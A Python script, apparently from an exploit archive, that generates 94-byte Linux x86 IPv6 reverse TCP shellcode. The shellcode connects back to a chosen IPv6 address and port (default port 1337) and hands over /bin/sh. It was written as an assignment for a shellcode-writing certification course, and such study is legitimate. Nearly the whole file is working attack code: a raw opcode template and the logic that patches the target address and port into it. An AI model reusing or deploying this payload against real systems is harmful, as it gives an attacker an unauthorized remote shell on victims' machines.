#!/usr/bin/env python3
# Exploit Title: Linux x86 IPv6 Reverse TCP Shellcode Generator (94 bytes)
# Date: 2018-08-26
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_2-reverse_shell
# Tested on: Shell on Ubuntu 18.04 with gcc 7.3.0 / Connecting to Kali 2018.2

# This shellcode will connect to fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509 on port 1337 and give you /bin/sh

#This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
#http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
#Student ID: SLAE-1134

from argparse import ArgumentParser
from ipaddress import ip_address
import sys

sc = ("\\x31\\xdb\\x53\\x43\\x53\\x6a\\x0a\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80"
      "\\x96\\x99\\x52\\x68{ipv6_fourth_octet}\\x68{ipv6_third_octet}\\x68"
      "{ipv6_second_octet}\\x68{ipv6_first_octet}\\x52\\x66\\x68{port}"
      "\\x66\\x6a\\x0a\\x89\\xe1\\x6a\\x1c\\x51\\x56\\x89\\xe1\\x43\\x43\\x6a"
      "\\x66\\x58\\xcd\\x80\\x87\\xde\\x29\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80"
      "\\x49\\x79\\xf9\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62"
      "\\x69\\x6e\\x89\\xd1\\x89\\xe3\\xb0\\x0b\\xcd\\x80")

if __name__ == '__main__':
    parser = ArgumentParser(description=("Dual Network Stack Bind Shell "
            "Generator"))
    parser.add_argument('ip_address', type=str, nargs='?', default='fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509',
            help='The IP address to connect to (default fd15:4ba5:5a2b:1002:61b7:23a9:ad3d:5509)')
    parser.add_argument('port', type=int, nargs='?', default=1337,
            help='The port to connect to (default 1337)')
    args = parser.parse_args()

    ip = ip_address(args.ip_address)
    ip_hex = ip.exploded

    if args.port < 1 or args.port > 65535:
        print('Invalid port. Please select a port between 1 and 65535')
        sys.exit(1)

    port = format(args.port, '04x')
    port = "\\x{b}\\x{a}".format(
            a=port[2:4],
            b=port[0:2])

    split_hex_ip = ip_hex.split(':')
    ipv6_fourth_octet = '\\x{d}\\x{c}\\x{b}\\x{a}'.format(
            d=split_hex_ip[6][0:2],
            c=split_hex_ip[6][2:4],
            b=split_hex_ip[7][0:2],
            a=split_hex_ip[7][2:4])
    ipv6_third_octet = '\\x{d}\\x{c}\\x{b}\\x{a}'.format(
            d=split_hex_ip[4][0:2],
            c=split_hex_ip[4][2:4],
            b=split_hex_ip[5][0:2],
            a=split_hex_ip[5][2:4])
    ipv6_second_octet = '\\x{d}\\x{c}\\x{b}\\x{a}'.format(
            d=split_hex_ip[2][0:2],
            c=split_hex_ip[2][2:4],
            b=split_hex_ip[3][0:2],
            a=split_hex_ip[3][2:4])
    ipv6_first_octet = '\\x{d}\\x{c}\\x{b}\\x{a}'.format(
            d=split_hex_ip[0][0:2],
            c=split_hex_ip[0][2:4],
            b=split_hex_ip[1][0:2],
            a=split_hex_ip[1][2:4])

    if '\\x00' in port:
        print('[!] Warning: The port you chose contains a null value.')
    if (('\\x00' in ipv6_fourth_octet) or ('\\x00' in ipv6_third_octet) or
            ('\\x00' in ipv6_second_octet) or ('\\x00' in ipv6_first_octet)):
        print('[!] Warning: The IP address you chose contains a null value.')

    print('Shellcode:')
    print(sc.format(
        ipv6_first_octet=str(ipv6_first_octet),
        ipv6_second_octet=str(ipv6_second_octet),
        ipv6_third_octet=str(ipv6_third_octet),
        ipv6_fourth_octet=str(ipv6_fourth_octet),
        port=str(port)))